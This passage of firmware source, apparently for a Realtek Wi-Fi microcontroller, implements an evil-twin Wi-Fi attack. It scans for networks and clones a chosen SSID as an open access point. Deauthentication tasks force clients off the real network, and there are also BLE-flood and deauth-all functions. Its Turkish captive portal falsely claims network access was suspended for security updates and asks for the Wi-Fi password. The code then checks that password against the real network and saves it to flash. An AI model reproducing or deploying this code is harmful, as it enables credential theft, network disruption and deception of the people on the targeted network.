  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");

  client.print("<h1>Bağlantı Doğrulaması</h1>");
  client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");

  if (conn_status == CS_RUNNING) {
      client.print("<div id='sbox' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  } else if (show_result) {
    if (conn_result == "ok") {
      client.print("<div class='status-box ok'>&#10003; Doğrulama başarılı. Sistem sıfırlanıyor...</div>");
    }
    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiğiniz Wi-Fi şifresi hatalı. Lütfen tekrar deneyiniz.</div>");
  } else {
    client.print("<div id='sbox' style='display:none;' class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
  }

  client.print("<div class='conn-status'>Erişim Sağlanacak Ağ:<br><b style='font-size:1.3rem; display:block; margin-top:8px; color:#0056b3;'>"); 
  client.print(target_ssid);
  client.print("</b></div>");

  client.print("<form method='POST' action='/connect' id='cf' onsubmit='handleSubmit()'>");
  client.print("<div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
  client.print("<input type='password' id='pass' name='pass' placeholder='Mevcut şifrenizi giriniz...' autocomplete='off' required>");
  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Şifreyi Göster</div></div>");
  client.print("<button type='submit' id='sbtn'>İnternete Bağlan</button></form>");

  client.print("<script>");
  client.print("function handleSubmit(){");
  client.print("  var box=document.getElementById('sbox');");
  client.print("  var btn=document.getElementById('sbtn');");
  client.print("  if(box){ box.style.display='block'; }");
  client.print("  if(btn){ btn.disabled=true; btn.style.opacity='0.6'; }");
  client.print("}");
  if (conn_status == CS_RUNNING) {
      client.print("function tryR(){");
      client.print("  var t=new Date().getTime();");
      client.print("  fetch('/?t='+t,{cache:'no-store',signal:AbortSignal.timeout(4000)})");
      client.print("    .then(function(r){if(r.ok){window.location.href='/?t='+t;}else{setTimeout(tryR,2000);}})");
      client.print("    .catch(function(){setTimeout(tryR,2000);});");
      client.print("}");
      client.print("setTimeout(tryR,3000);");
  }
  client.print("</script>");

  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
}


void handleClient(WiFiClient &client) {
  static char hbuf[896];
  int total = 0;
  unsigned long first_byte_deadline = millis() + 600;
  unsigned long full_header_deadline = 0;

  while (client.connected() && total < (int)sizeof(hbuf) - 1) {
    int avail = client.available();
    if (avail > 0) {
      if (full_header_deadline == 0) full_header_deadline = millis() + 400;
      int toRead = avail;
      if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
      int n = client.read((uint8_t*)hbuf + total, toRead);
      if (n > 0) {
        total += n;
        hbuf[total] = '\0';
        if (strstr(hbuf, "\r\n\r\n")) break;
      }
    } else {
      if (full_header_deadline > 0 && millis() > full_header_deadline) break;
      if (full_header_deadline == 0 && millis() > first_byte_deadline)  break;
      delayMicroseconds(200);
    }
  }
  if (total == 0) return;
  hbuf[total] = '\0';

  char *sp1 = strchr(hbuf, ' ');
  char *sp2 = sp1 ? strchr(sp1 + 1, ' ') : NULL;
  char rawpath[128] = "/";
  if (sp1 && sp2 && (sp2 - sp1 - 1) < (int)sizeof(rawpath)) {
    int plen = sp2 - sp1 - 1;
    memcpy(rawpath, sp1 + 1, plen);
    rawpath[plen] = '\0';
    char *qm = strchr(rawpath, '?');
    if (qm) *qm = '\0';
  }

  char hostbuf[64] = "";
  char *hi = strstr(hbuf, "\r\nHost: ");
  if (hi) {
    hi += 8;
    char *he = strstr(hi, "\r\n");
    if (he) {
      int hlen = he - hi; if (hlen >= (int)sizeof(hostbuf)) hlen = sizeof(hostbuf) - 1;
      memcpy(hostbuf, hi, hlen); hostbuf[hlen] = '\0';
      char *col = strchr(hostbuf, ':'); if (col) *col = '\0';
    }
  }

  bool is_generate_204  = strstr(rawpath, "generate_204")  != NULL;
  bool path_is_captive  = is_generate_204
                      || strstr(rawpath, "hotspot-detect") != NULL
                      || strstr(rawpath, "redirect")       != NULL
                      || strstr(rawpath, "connecttest")    != NULL
                      || strstr(rawpath, "ncsi")           != NULL
                      || strstr(rawpath, "canonical")      != NULL
                      || strstr(rawpath, "success.html")   != NULL
                      || strstr(rawpath, "mobile/status")  != NULL
                      || strstr(rawpath, "library/test")   != NULL
                      || strstr(rawpath, "internet_check") != NULL
                      || strstr(rawpath, "wpad.dat")       != NULL
                      || strstr(rawpath, "gen_204")        != NULL
                      || strstr(rawpath, "check_network")  != NULL
                      || strstr(rawpath, "wispr")          != NULL;
  bool host_is_foreign  = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);

  // Android için /generate_204: 302 redirect gönder (popup tetikler)
  if (is_generate_204) {
    client.print(buildRedirect());
    client.flush();
    return;
  }

  // Diğer captive detection path'leri veya yabancı host → redirect
  if (path_is_captive || host_is_foreign) {
    client.print(buildRedirect());
    client.flush();
    return;
  }

  // ap_switched modunda: portal sayfası dışındaki her istek → redirect
  // (Host header parse edilemese bile captive portal açılır)
  if (ap_switched) {
    bool is_portal_path = (strcmp(rawpath, "/") == 0)
                       || (strcmp(rawpath, "/connect") == 0)
                       || (strstr(rawpath, "/status") != NULL);
    if (!is_portal_path) {
      client.print(buildRedirect());
      client.flush();
      return;
    }
  }

  String request(hbuf);
  String path(rawpath);

  String body = ""; int content_len = 0;
  int cl_idx = request.indexOf("Content-Length: ");
  if (cl_idx != -1) {
    content_len = request.substring(cl_idx + 16, request.indexOf("\r\n", cl_idx)).toInt();
    if (content_len > 256) content_len = 256;
  }
  if (content_len > 0) {
    body.reserve(content_len); int br = 0; unsigned long timeout = millis() + 400;
    while (br < content_len && millis() < timeout) {
      int av = client.available();
      if (av > 0) {
        int rd = (av < content_len - br) ? av : (content_len - br);
        for (int i = 0; i < rd; i++) body += (char)client.read();
        br += rd;
      } else delayMicroseconds(250);
    }
  }

  String hostHeader(hostbuf);

  if (!ap_switched) {
    if (request.startsWith("POST") && path == "/delete_cred") {
      memset(saved_ssid, 0, MAX_SSID_LEN);
      memset(saved_pass, 0, MAX_PASS_LEN);
      saveCredentials("", ""); 
      sendStartPage(client);   
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/rescan") {
      if (scan_status != SCAN_RUNNING) startScan();
      sendStartPage(client); 
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/deauth_all") {
      if (deauth_all_active) {
        deauth_all_active = false;
        delay(50);
      } else {
        if (scan_status != SCAN_RUNNING && networks.size() > 0) {
          deauth_all_active = true;
          xTaskCreate(deauthAllTask, "dauth_all", 4096, NULL, tskIDLE_PRIORITY + 3, NULL);
        }
      }
      sendStartPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/ble_flood") {
      if (ble_flood_active) {
        ble_flood_active = false;
        delay(50);
      } else {
        ble_flood_active = true;
        xTaskCreate(bleFloodTask, "ble_flood", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
      }
      sendStartPage(client);
      client.flush();
      return;
    }

    if (request.startsWith("POST") && path == "/start_ap") {
      String sel_ssid = parsePostParam(body, "ssid");
      if (sel_ssid.length() == 0) { sendStartPage(client); return; }

      strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
      target_ssid[MAX_SSID_LEN - 1] = '\0';
      target_channel = 6;
      target_enc     = ENC_TYPE_CCMP;
      target_sec     = RTW_SECURITY_WPA2_AES_PSK;
      target_5g_channel = 0;
      memset(target_5g_bssid, 0, 6);

      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (net.ssid == sel_ssid) {
          target_channel = net.channel;
          target_enc     = net.enc;
          target_sec     = net.raw_sec;
          memcpy(target_bssid, net.bssid, 6);
          break;
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);

      sendSwitchingPage(client);
      pending_ap_switch = true; 
      client.flush();
      return;
    }
    sendStartPage(client); 
    client.flush();
    return;
  }

  if (request.startsWith("POST") && path == "/connect") {
    if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
    String sel_pass = parsePostParam(body, "pass");

    deauth_active = false; 
    delay(50);  // 100'den 50'ye indirildi

    strncpy(pending_ssid, target_ssid, MAX_SSID_LEN - 1);
    pending_ssid[MAX_SSID_LEN - 1] = '\0';
    strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
    pending_pass[MAX_PASS_LEN - 1] = '\0';
    pending_sec = target_sec;

    conn_result = "";
    startConnectTask();
    sendPortalPage(client, false); 
    client.flush();
    return;
  }

  sendPortalPage(client, conn_result.length() > 0);
  client.flush();
}

void setup() {

  networks_mutex = xSemaphoreCreateMutex();

  // BLE her görev içinde kendi init/begin/end döngüsünü yönetiyor

  FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
  loadCredentials();

  LwIP_Init();
  wifi_on(RTW_MODE_STA_AP); delay(300);

  wifi_disable_powersave();

  wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
  delay(800);

  wifi_disable_powersave();

  ip4_addr_t ip, mask, gw;
  IP4_ADDR(&ip,   192, 168, 4, 1);
  IP4_ADDR(&mask, 255, 255, 255, 0);
  IP4_ADDR(&gw,   192, 168, 4, 1);
  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
  netif_set_up(&xnetif[1]); 
  netif_set_link_up(&xnetif[1]);

  dhcps_init(&xnetif[1]); 
  delay(400);

  server.begin();
  dnsServer.setResolvedIP(192, 168, 4, 1);
  dnsServer.begin();

  if (xnetif[1].hwaddr_len == 6) {
    memcpy(fake_ap_bssid, xnetif[1].hwaddr, 6);
  }

  startScan();
}

void loop() {
  if (pending_ap_switch) {
    pending_ap_switch = false;
    ap_switched = true;

    delay(500);

    deauth_active = false;

    dnsServer.stop();
    delay(50);
    dhcps_deinit();
    delay(150);

    wifi_set_mode(RTW_MODE_STA);
    delay(400);

    wifi_set_mode(RTW_MODE_STA_AP);
    delay(400);

    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);

    delay(700);

    ip4_addr_t ip, mask, gw;
    IP4_ADDR(&ip,   192, 168, 4, 1);
    IP4_ADDR(&mask, 255, 255, 255, 0);
    IP4_ADDR(&gw,   192, 168, 4, 1);
    netif_set_addr(&xnetif[1], &ip, &mask, &gw);

    netif_set_up(&xnetif[1]); 
    netif_set_link_up(&xnetif[1]);
    delay(150);

    dhcps_init(&xnetif[1]);
    delay(500);

    dnsServer.begin();
    delay(150);

    wifi_disable_powersave();

    uint8_t new_bssid[6];
    memset(new_bssid, 0, 6);

    if (xnetif[1].hwaddr_len == 6) {
        memcpy(new_bssid, xnetif[1].hwaddr, 6);
    } else {
        memset(new_bssid, 0, 6);
    }

    memcpy(fake_ap_bssid, new_bssid, 6);

    ap_running_channel = target_channel;

    delay(1000);
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (scan_status == SCAN_DONE) {
    if (ap_switched) {
      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (memcmp(net.bssid, target_bssid, 6) == 0 && net.channel != target_channel) {
          target_channel = net.channel;
        }
        if (net.channel >= 36 && target_bssid[0] != 0 && isSisterBSSID(target_bssid, net.bssid)) {
          target_5g_channel = net.channel;
          memcpy(target_5g_bssid, net.bssid, 6);
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);
    }
    scan_status = SCAN_IDLE;
  }

  if (ap_switched && ap_running_channel != -1 && ap_running_channel != target_channel) {
    deauth_active = false;
    delay(300);
    dnsServer.stop();
    delay(150);

    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);

    delay(1200);
    netif_set_up(&xnetif[1]);
    netif_set_link_up(&xnetif[1]);
    delay(400);

    dhcps_deinit();
    delay(150);
    dhcps_init(&xnetif[1]);
    delay(700);

    dnsServer.begin();
    wifi_disable_powersave();
    ap_running_channel = target_channel;

    delay(1000);
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (conn_status == CS_DONE_OK) {
    sta_connected = true;
    strncpy(saved_ssid, pending_ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, pending_pass, MAX_PASS_LEN - 1);

    saveCredentials(saved_ssid, saved_pass);

    deauth_active = false;
    delay(50);  // 100'den 50'ye indirildi

    conn_result = "ok"; 
    conn_status = CS_IDLE;

    revert_time = millis() + 1500;  // 2000'den 1500'e indirildi - daha hızlı yönlendirme

  } else if (conn_status == CS_DONE_FAIL) {
    sta_connected = false; 
    conn_result = "fail"; 
    conn_status = CS_IDLE;

    if (ap_switched) {
      deauth_active = false;
      delay(50);  // 100'den 50'ye indirildi
      deauth_active = true;
      delay(500);
      xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
    }
  }

  if (revert_time > 0 && millis() > revert_time) {
    revert_time = 0;
    delay(100);     
    sys_reset();    
  }

  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
  }

  if (ap_switched && (millis() - last_netif_check_ms > NETIF_CHECK_INTERVAL_MS)) {
    last_netif_check_ms = millis();
    if (!netif_is_up(&xnetif[1]) || !netif_is_link_up(&xnetif[1])) {
      netif_set_up(&xnetif[1]);
      netif_set_link_up(&xnetif[1]);
      dhcps_init(&xnetif[1]);
    }
    wifi_set_channel(target_channel);
    wifi_disable_powersave();
  }

  WiFiClient client = server.available();
  if (client && client.connected()) {
    portal_busy = true;
    handleClient(client);
    if (client.connected()) client.flush();
    client.stop();
    portal_busy = false;
  }

  delay(1);
}
